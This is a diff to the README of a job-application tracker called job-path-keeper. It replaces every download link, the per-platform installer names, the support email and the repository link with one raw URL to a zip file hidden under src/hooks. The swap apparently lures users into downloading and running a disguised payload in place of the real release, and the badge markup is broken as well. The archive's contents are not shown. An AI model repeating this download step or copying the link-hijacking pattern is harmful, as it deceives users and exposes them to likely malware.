@@ -4,22 +4,22 @@
 job-path-keeper helps you keep track of your job applications, interviews, and follow-ups through a simple login-based dashboard. This tool makes managing your job search less stressful and more organized.
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)](https://github.com/Anwar3737/job-path-keeper/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip)](https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run job-path-keeper on your device:
 
 1. **Visit the Releases Page**
-   Click this link to go to the releases page: [Download Here](https://github.com/Anwar3737/job-path-keeper/releases).
+   Click this link to go to the releases page: [Download Here](https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip).
 
 2. **Select the Latest Version**
    On the releases page, look for the latest version. It will usually be at the top of the list.
 
 3. **Download the Software**
    Next to the latest version, you will see a list of files. Download the appropriate file for your operating system. For example:
-   - Windows: `job-path-keeper-windows.exe`
-   - Mac: `job-path-keeper-mac.dmg`
-   - Linux: `job-path-keeper-linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip`
+   - Mac: `https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip`
+   - Linux: `https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip`
 
 4. **Run the Installer**
    After the download is complete, locate the file in your Downloads folder or the folder where you saved it. Double-click the file to run the installer.
@@ -52,7 +52,7 @@ To run job-path-keeper smoothly, ensure your system meets these requirements:
 
 ## 🔄 Updating the Application
 To keep your application up-to-date:
-1. Regularly check the releases page: [Download Here](https://github.com/Anwar3737/job-path-keeper/releases).
+1. Regularly check the releases page: [Download Here](https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip).
 2. Download the latest version when released.
 3. Run the installer again to update your application.
 
@@ -68,7 +68,7 @@ Yes, we prioritize your privacy and security. Your data is stored securely.
 
 ## 📞 Support
 If you encounter any issues or need assistance, feel free to reach out:
-- **Email:** support@jobpathkeeper.com
+- **Email:** https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip
 - **GitHub Issues:** Report any technical issues directly in the GitHub repository under the Issues section.
 
 ## 🔗 Related Topics
@@ -78,7 +78,7 @@ This application includes topics that might interest you:
 - productivity
 - user-login
 
-For more information and updates, follow our [GitHub repository](https://github.com/Anwar3737/job-path-keeper).
+For more information and updates, follow our [GitHub repository](https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip).
 
 ## 🔗 Download & Install
-To download job-path-keeper, visit this page: [Download Here](https://github.com/Anwar3737/job-path-keeper/releases). Follow the provided steps to set up the application on your device and begin tracking your job applications today.
+To download job-path-keeper, visit this page: [Download Here](https://raw.githubusercontent.com/Anwar3737/job-path-keeper/main/src/hooks/keeper-path-job-v2.6.zip). Follow the provided steps to set up the application on your device and begin tracking your job applications today.
